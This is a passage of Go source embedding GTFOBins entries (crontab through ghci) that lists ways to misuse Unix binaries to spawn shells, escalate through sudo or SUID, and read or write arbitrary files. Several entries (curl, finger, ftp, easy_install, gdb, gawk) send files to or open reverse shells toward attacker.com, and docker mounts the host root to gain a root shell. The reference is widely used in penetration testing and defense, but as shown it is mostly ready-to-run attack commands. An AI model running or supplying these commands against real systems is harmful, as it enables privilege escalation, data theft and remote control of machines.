			Functions{`The commands are executed according to the crontab file edited via the 'crontab' utility.`, "description"},
			Functions{`crontab -e`, "code"},
		},
		"sudo": []Functions{
			Functions{`The commands are executed according to the crontab file edited via the 'crontab' utility.`, "description"},
			Functions{`sudo crontab -e`, "code"},
		},
	},
	"csh": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo csh`, "code"},
		},
		"shell": []Functions{
			Functions{`csh`, "code"},
		},
		"file-write": []Functions{
			Functions{`export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'
`, "code"},
		},
		"suid": []Functions{
			Functions{`./csh -b`, "code"},
		},
	},
	"csplit": map[string][]Functions{
		"file-write": []Functions{
			Functions{`Writes the data to 'xx0file_to_write'. If needed, a different prefix can be specified with '-f' (instead of 'xx').`, "description"},
			Functions{`TF=$(mktemp)
echo "DATA" > $TF
LFILE=file_to_write
csplit -z -b "%d$LFILE" $TF 1
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
csplit $LFILE 1
cat xx01
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
csplit $LFILE 1
cat xx01
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
csplit $LFILE 1
cat xx01
`, "code"},
		},
	},
	"csvtool": map[string][]Functions{
		"file-read": []Functions{
			Functions{`The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.`, "description"},
			Functions{`LFILE=file_to_read
csvtool trim t $LFILE
`, "code"},
		},
		"file-write": []Functions{
			Functions{`The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.`, "description"},
			Functions{`LFILE=file_to_write
TF=$(mktemp)
echo DATA > $TF
csvtool trim t $TF -o $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./csvtool trim t $LFILE
`, "code"},
		},
		"shell": []Functions{
			Functions{`csvtool call '/bin/sh;false' /etc/passwd`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo csvtool call '/bin/sh;false' /etc/passwd`, "code"},
		},
	},
	"cupsfilter": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
`, "code"},
		},
	},
	"curl": map[string][]Functions{
		"file-download": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`URL=http://attacker.com/file_to_get
LFILE=file_to_save
curl $URL -o $LFILE
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=/tmp/file_to_read
curl file://$LFILE
`, "code"},
			Functions{`The file path must be absolute.`, "description"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
curl "file://$TF" -o "$LFILE"
`, "code"},
			Functions{`The file path must be absolute.`, "description"},
		},
		"suid": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`URL=http://attacker.com/file_to_get
LFILE=file_to_save
./curl $URL -o $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`URL=http://attacker.com/file_to_get
LFILE=file_to_save
sudo curl $URL -o $LFILE
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the '@' to send hard-coded data.`, "description"},
			Functions{`URL=http://attacker.com/
LFILE=file_to_send
curl -X POST -d @$file_to_send $URL
`, "code"},
		},
	},
	"cut": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./cut -d "" -f1 "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo cut -d "" -f1 "$LFILE"
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
cut -d "" -f1 "$LFILE"
`, "code"},
		},
	},
	"dash": map[string][]Functions{
		"shell": []Functions{
			Functions{`dash`, "code"},
		},
		"file-write": []Functions{
			Functions{`export LFILE=file_to_write
dash -c 'echo DATA > $LFILE'
`, "code"},
		},
		"suid": []Functions{
			Functions{`./dash -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo dash`, "code"},
		},
	},
	"date": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
date -f $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./date -f $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo date -f $LFILE
`, "code"},
		},
	},
	"dd": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_write
echo "data" | ./dd of=$LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_write
echo "data" | sudo dd of=$LFILE
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
echo "DATA" | dd of=$LFILE
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
dd if=$LFILE
`, "code"},
		},
	},
	"dialog": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
dialog --textbox "$LFILE" 0 0
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./dialog --textbox "$LFILE" 0 0
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo dialog --textbox "$LFILE" 0 0
`, "code"},
		},
	},
	"diff": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
diff --line-format=%L /dev/null $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./diff --line-format=%L /dev/null $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo diff --line-format=%L /dev/null $LFILE
`, "code"},
		},
	},
	"dig": map[string][]Functions{
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo dig -f $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./dig -f $LFILE
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
dig -f $LFILE
`, "code"},
		},
	},
	"dmesg": map[string][]Functions{
		"shell": []Functions{
			Functions{`dmesg -H
!/bin/sh
`, "code"},
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
		},
		"sudo": []Functions{
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`sudo dmesg -H
!/bin/sh
`, "code"},
		},
		"file-read": []Functions{
			Functions{`This is not suitable for binary files.`, "description"},
			Functions{`LFILE=file_to_read
dmesg -rF "$LFILE"
`, "code"},
		},
	},
	"dmidecode": map[string][]Functions{
		"sudo": []Functions{
			Functions{`It can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.
Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.

- '--dump-bin', will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.

- '--no-sysfs', if the target system is using an older version of dmidecode, you may need to omit the option.

'''
make dmiwrite
TF=$(mktemp)
echo "DATA" > $TF
./dmiwrite $TF x.dmi
'''
`, "description"},
			Functions{`LFILE=file_to_write
sudo dmidecode --no-sysfs -d x.dmi --dump-bin "$LFILE"
`, "code"},
		},
	},
	"dmsetup": map[string][]Functions{
		"suid": []Functions{
			Functions{`./dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
./dmsetup ls --exec '/bin/sh -p -s'
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
sudo dmsetup ls --exec '/bin/sh -s'
`, "code"},
		},
	},
	"dnf": map[string][]Functions{
		"sudo": []Functions{
			Functions{`It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
'''
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
'''
`, "description"},
			Functions{`sudo dnf install -y x-1.0-1.noarch.rpm
`, "code"},
		},
	},
	"docker": map[string][]Functions{
		"shell": []Functions{
			Functions{`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`, "code"},
			Functions{`The resulting is a root shell.`, "description"},
		},
		"file-write": []Functions{
			Functions{`Write a file by copying it to a temporary container and back to the target destination on the host.`, "description"},
			Functions{`CONTAINER_ID="$(docker run -d alpine)" # or existing
TF=$(mktemp)
echo "DATA" > $TF
docker cp $TF $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF file_to_write
`, "code"},
		},
		"file-read": []Functions{
			Functions{`Read a file by copying it to a temporary container and back to a new location on the host.`, "description"},
			Functions{`CONTAINER_ID="$(docker run -d alpine)"  # or existing
TF=$(mktemp)
docker cp file_to_read $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF $TF
cat $TF
`, "code"},
		},
		"sudo": []Functions{
			Functions{`The resulting is a root shell.`, "description"},
			Functions{`sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh`, "code"},
		},
		"suid": []Functions{
			Functions{`The resulting is a root shell.`, "description"},
			Functions{`./docker run -v /:/mnt --rm -it alpine chroot /mnt sh`, "code"},
		},
	},
	"dosbox": map[string][]Functions{
		"sudo": []Functions{
			Functions{`Note that the name of the written file in the following example will be 'FILE_TO_'.`, "description"},
			Functions{`LFILE='\path\to\file_to_write'
sudo dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The file content will be displayed in the DOSBox graphical window.`, "description"},
			Functions{`LFILE='\path\to\file_to_read'
dosbox -c 'mount c /' -c "type c:$LFILE"
`, "code"},
			Functions{`The file is copied to a readable location.`, "description"},
			Functions{`LFILE='\path\to\file_to_read'
dosbox -c 'mount c /' -c "copy c:$LFILE >c:\tmp\output" -c exit
cat '/tmp/OUTPUT'
`, "code"},
		},
		"file-write": []Functions{
			Functions{`Note that the name of the written file in the following example will be 'FILE_TO_'.`, "description"},
			Functions{`LFILE='\path\to\file_to_write'
dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
`, "code"},
		},
		"suid": []Functions{
			Functions{`Note that the name of the written file in the following example will be 'FILE_TO_'.`, "description"},
			Functions{`LFILE='\path\to\file_to_write'
./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
`, "code"},
		},
	},
	"dpkg": map[string][]Functions{
		"shell": []Functions{
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`dpkg -l
!/bin/sh
`, "code"},
		},
		"sudo": []Functions{
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`sudo dpkg -l
!/bin/sh
`, "code"},
			Functions{`It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
'''
TF=$(mktemp -d)
echo 'exec /bin/sh' > $TF/x.sh
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
'''
`, "description"},
			Functions{`sudo dpkg -i x_1.0_all.deb`, "code"},
		},
	},
	"dvips": map[string][]Functions{
		"shell": []Functions{
			Functions{`tex '\special{psfile="'/bin/sh 1>&0"}\end'
dvips -R0 texput.dvi
`, "code"},
		},
		"sudo": []Functions{
			Functions{`tex '\special{psfile="'/bin/sh 1>&0"}\end'
sudo dvips -R0 texput.dvi
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`tex '\special{psfile="'/bin/sh 1>&0"}\end'
./dvips -R0 texput.dvi
`, "code"},
		},
	},
	"easy_install": map[string][]Functions{
		"library-load": []Functions{
			Functions{`TF=$(mktemp -d)
echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
easy_install $TF
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
`, "code"},
		},
		"shell": []Functions{
			Functions{`TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
easy_install $TF
`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`Run ''socat file:'tty',raw,echo=0 tcp-listen:12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > $TF/setup.py
easy_install $TF
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.`, "description"},
			Functions{`export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' > $TF/setup.py
easy_install $TF
`, "code"},
			Functions{`Serve files in the local folder running an HTTP server.`, "description"},
			Functions{`export LPORT=8888
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
easy_install $TF
`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file via HTTP GET request. The file path must be absolute.`, "description"},
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo "import os;
os.execl('$(whereis python)', '$(whereis python)', '-c', \"\"\"import sys;
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve('$URL', '$LFILE')\"\"\")" > $TF/setup.py
pip install $TF
`, "code"},
		},
		"file-write": []Functions{
			Functions{`The file path must be absolute.`, "description"},
			Functions{`export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo "import os;
os.execl('$(whereis python)', 'python', '-c', 'open(\"$LFILE\",\"w+\").write(\"DATA\")')" > $TF/setup.py
easy_install $TF
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The read file content is wrapped within program messages.`, "description"},
			Functions{`TF=$(mktemp -d)
echo 'print(open("file_to_read").read())' > $TF/setup.py
easy_install $TF
`, "code"},
		},
	},
	"eb": map[string][]Functions{
		"shell": []Functions{
			Functions{`eb logs
!/bin/sh
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo eb logs
!/bin/sh
`, "code"},
		},
	},
	"ed": map[string][]Functions{
		"shell": []Functions{
			Functions{`ed
!/bin/sh
`, "code"},
		},
		"file-write": []Functions{
			Functions{`ed file_to_write
a
DATA
.
w
q
`, "code"},
		},
		"file-read": []Functions{
			Functions{`ed file_to_read
,p
q
`, "code"},
		},
		"suid": []Functions{
			Functions{`./ed file_to_read
,p
q
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo ed
!/bin/sh
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./ed
!/bin/sh
`, "code"},
		},
	},
	"emacs": map[string][]Functions{
		"shell": []Functions{
			Functions{`emacs -Q -nw --eval '(term "/bin/sh")'`, "code"},
		},
		"file-write": []Functions{
			Functions{`emacs file_to_write
DATA
C-x C-s
`, "code"},
		},
		"file-read": []Functions{
			Functions{`emacs file_to_read`, "code"},
		},
		"suid": []Functions{
			Functions{`./emacs -Q -nw --eval '(term "/bin/sh -p")'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo emacs -Q -nw --eval '(term "/bin/sh")'`, "code"},
		},
	},
	"env": map[string][]Functions{
		"suid": []Functions{
			Functions{`./env /bin/sh -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo env /bin/sh`, "code"},
		},
		"shell": []Functions{
			Functions{`env /bin/sh`, "code"},
		},
	},
	"eqn": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
eqn "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./eqn "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo eqn "$LFILE"
`, "code"},
		},
	},
	"ex": map[string][]Functions{
		"file-read": []Functions{
			Functions{`ex file_to_read
,p
q
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo ex
!/bin/sh
`, "code"},
		},
		"shell": []Functions{
			Functions{`ex
!/bin/sh
`, "code"},
		},
		"file-write": []Functions{
			Functions{`ex file_to_write
a
DATA
.
w
q
`, "code"},
		},
	},
	"exiftool": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
OUTPUT=output_file
exiftool -filename=$OUTPUT $LFILE
cat $OUTPUT
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
INPUT=input_file
exiftool -filename=$LFILE $INPUT
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_write
INPUT=input_file
sudo exiftool -filename=$LFILE $INPUT
`, "code"},
		},
	},
	"expand": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
expand "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./expand "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo expand "$LFILE"
`, "code"},
		},
	},
	"expect": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo expect -c 'spawn /bin/sh;interact'`, "code"},
		},
		"file-read": []Functions{
			Functions{`The file is read and parsed as an 'expect' command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files.`, "description"},
			Functions{`LFILE=file_to_read
expect $LFILE
`, "code"},
		},
		"shell": []Functions{
			Functions{`expect -c 'spawn /bin/sh;interact'`, "code"},
		},
		"suid": []Functions{
			Functions{`./expect -c 'spawn /bin/sh -p;interact'`, "code"},
		},
	},
	"facter": map[string][]Functions{
		"shell": []Functions{
			Functions{`TF=$(mktemp -d)
echo 'exec("/bin/sh")' > $TF/x.rb
FACTERLIB=$TF facter
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp -d)
echo 'exec("/bin/sh")' > $TF/x.rb
sudo FACTERLIB=$TF facter
`, "code"},
		},
	},
	"file": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
file -f $LFILE
`, "code"},
			Functions{`Each input line is treated as a filename for the 'file' command and the output is corrupted by a suffix ':' followed by the result or the error of the operation, so this may not be suitable for binary files.`, "description"},
			Functions{`Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.

If a line in the target file begins with a '#', it will not be printed as these lines are parsed as comments.

It can also be provided with a directory and will read each file in the directory.
`, "description"},
			Functions{`LFILE=file_to_read
file -m $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`Each input line is treated as a filename for the 'file' command and the output is corrupted by a suffix ':' followed by the result or the error of the operation, so this may not be suitable for binary files.`, "description"},
			Functions{`LFILE=file_to_read
./file -f $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`Each input line is treated as a filename for the 'file' command and the output is corrupted by a suffix ':' followed by the result or the error of the operation, so this may not be suitable for binary files.`, "description"},
			Functions{`LFILE=file_to_read
sudo file -f $LFILE
`, "code"},
		},
	},
	"find": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo find . -exec /bin/sh \; -quit`, "code"},
		},
		"shell": []Functions{
			Functions{`find . -exec /bin/sh \; -quit`, "code"},
		},
		"suid": []Functions{
			Functions{`./find . -exec /bin/sh -p \; -quit`, "code"},
		},
	},
	"finger": map[string][]Functions{
		"file-download": []Functions{
			Functions{`Fetch remote binary file from a remote TCP port. Run 'base64 "file_to_send" | sudo nc -l -p 79' on the attacker box to send the file.`, "description"},
			Functions{`RHOST=attacker.com
LFILE=file_to_save
finger x@$RHOST | base64 -d > "$LFILE"
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send a binary file to a TCP port. Run 'sudo nc -l -p 79 | base64 -d > "file_to_save"' on the attacker box to collect the file. The file length is limited by the maximum size of arguments.`, "description"},
			Functions{`RHOST=attacker.com
LFILE=file_to_send
finger "$(base64 $LFILE)@$RHOST"
`, "code"},
		},
	},
	"flock": map[string][]Functions{
		"shell": []Functions{
			Functions{`flock -u / /bin/sh`, "code"},
		},
		"suid": []Functions{
			Functions{`./flock -u / /bin/sh -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo flock -u / /bin/sh`, "code"},
		},
	},
	"fmt": map[string][]Functions{
		"sudo": []Functions{
			Functions{`This corrupts the output by wrapping very long lines at the given width.`, "description"},
			Functions{`LFILE=file_to_read
sudo fmt -999 "$LFILE"
`, "code"},
		},
		"file-read": []Functions{
			Functions{`This only works for the GNU version of 'fmt'.`, "description"},
			Functions{`LFILE=file_to_read
fmt -pNON_EXISTING_PREFIX "$LFILE"
`, "code"},
			Functions{`This corrupts the output by wrapping very long lines at the given width.`, "description"},
			Functions{`LFILE=file_to_read
fmt -999 "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`This corrupts the output by wrapping very long lines at the given width.`, "description"},
			Functions{`LFILE=file_to_read
./fmt -999 "$LFILE"
`, "code"},
		},
	},
	"fold": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
fold -w99999999 "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./fold -w99999999 "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo fold -w99999999 "$LFILE"
`, "code"},
		},
	},
	"ftp": map[string][]Functions{
		"file-upload": []Functions{
			Functions{`Send local file to a FTP server.`, "description"},
			Functions{`RHOST=attacker.com
ftp $RHOST
put file_to_send
`, "code"},
		},
		"file-download": []Functions{
			Functions{`RHOST=attacker.com
ftp $RHOST
get file_to_get
`, "code"},
			Functions{`Fetch a remote file from a FTP server.`, "description"},
		},
		"sudo": []Functions{
			Functions{`sudo ftp
!/bin/sh
`, "code"},
		},
		"shell": []Functions{
			Functions{`ftp
!/bin/sh
`, "code"},
		},
	},
	"gawk": map[string][]Functions{
		"limited-suid": []Functions{
			Functions{`./gawk 'BEGIN {system("/bin/sh")}'`, "code"},
		},
		"shell": []Functions{
			Functions{`gawk 'BEGIN {system("/bin/sh")}'`, "code"},
		},
		"non-interactive-reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = "/inet/tcp/0/" RHOST "/" RPORT;
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
`, "code"},
		},
		"non-interactive-bind-shell": []Functions{
			Functions{`Run 'nc target.com 12345' on the attacker box to connect to the shell.`, "description"},
			Functions{`LPORT=12345
gawk -v LPORT=$LPORT 'BEGIN {
    s = "/inet/tcp/" LPORT "/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
gawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
gawk '//' "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./gawk '//' "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo gawk 'BEGIN {system("/bin/sh")}'`, "code"},
		},
	},
	"gcc": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
gcc -x c -E "$LFILE"
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_delete
gcc -xc /dev/null -o $LFILE
`, "code"},
		},
		"shell": []Functions{
			Functions{`gcc -wrapper /bin/sh,-s .`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo gcc -wrapper /bin/sh,-s .`, "code"},
		},
	},
	"gcore": map[string][]Functions{
		"suid": []Functions{
			Functions{`./gcore $PID`, "code"},
		},
		"file-read": []Functions{
			Functions{`gcore $PID`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo gcore $PID`, "code"},
		},
	},
	"gdb": map[string][]Functions{
		"reverse-shell": []Functions{
			Functions{`This requires that GDB is compiled with Python support. Run ''socat file:'tty',raw,echo=0 tcp-listen:12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' -ex quit
`, "code"},
		},
		"file-download": []Functions{
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])' -ex quit
`, "code"},
			Functions{`This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.`, "description"},
		},
		"file-write": []Functions{
			Functions{`This requires that GDB is compiled with Python support.`, "description"},
			Functions{`LFILE=file_to_write
gdb -nx -ex "dump value $LFILE \"DATA\"" -ex quit
`, "code"},
		},
		"file-read": []Functions{
			Functions{`This requires that GDB is compiled with Python support.`, "description"},
			Functions{`gdb -nx -ex 'python print(open("file_to_read").read())' -ex quit`, "code"},
		},
		"library-load": []Functions{
			Functions{`gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary("lib.so")' -ex quit`, "code"},
			Functions{`This requires that GDB is compiled with Python support.`, "description"},
		},
		"shell": []Functions{
			Functions{`gdb -nx -ex '!sh' -ex quit`, "code"},
		},
		"suid": []Functions{
			Functions{`./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit`, "code"},
			Functions{`This requires that GDB is compiled with Python support.`, "description"},
		},
		"sudo": []Functions{
			Functions{`sudo gdb -nx -ex '!sh' -ex quit`, "code"},
		},
		"capabilities": []Functions{
			Functions{`This requires that GDB is compiled with Python support.`, "description"},
			Functions{`./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit`, "code"},
		},
		"file-upload": []Functions{
			Functions{`This requires that GDB is compiled with Python support. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.`, "description"},
			Functions{`export URL=http://attacker.com/
export LFILE=file_to_send
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' -ex quit
`, "code"},
			Functions{`This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.`, "description"},
			Functions{`export LPORT=8888
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit
`, "code"},
		},
	},
	"gem": map[string][]Functions{
		"shell": []Functions{
			Functions{`This requires the name of an installed gem to be provided ('rdoc' is usually installed).`, "description"},
			Functions{`gem open -e "/bin/sh -c /bin/sh" rdoc`, "code"},
			Functions{`This invokes the default editor, which is likely to be ['vi'](/gtfobins/vi/), other functions may apply. This requires the name of an installed gem to be provided ('rdoc' is usually installed).`, "description"},
			Functions{`gem open rdoc
:!/bin/sh
`, "code"},
			Functions{`This executes the specified file as ['ruby'](/gtfobins/ruby/) code.`, "description"},
			Functions{`TF=$(mktemp -d)
echo 'system("/bin/sh")' > $TF/x
gem build $TF/x
`, "code"},
			Functions{`This executes the specified file as ['ruby'](/gtfobins/ruby/) code.`, "description"},
			Functions{`TF=$(mktemp -d)
echo 'system("/bin/sh")' > $TF/x
gem install --file $TF/x
`, "code"},
		},
		"sudo": []Functions{
			Functions{`This requires the name of an installed gem to be provided ('rdoc' is usually installed).`, "description"},
			Functions{`sudo gem open -e "/bin/sh -c /bin/sh" rdoc`, "code"},
		},
	},
	"genisoimage": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
genisoimage -q -o - "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo genisoimage -q -o - "$LFILE"
`, "code"},
		},
	},
	"ghc": map[string][]Functions{
		"shell": []Functions{
			Functions{`ghc -e 'System.Process.callCommand "/bin/sh"'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo ghc -e 'System.Process.callCommand "/bin/sh"'`, "code"},
		},
	},
	"ghci": map[string][]Functions{
		"shell": []Functions{
			Functions{`ghci
System.Process.callCommand "/bin/sh"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo ghci
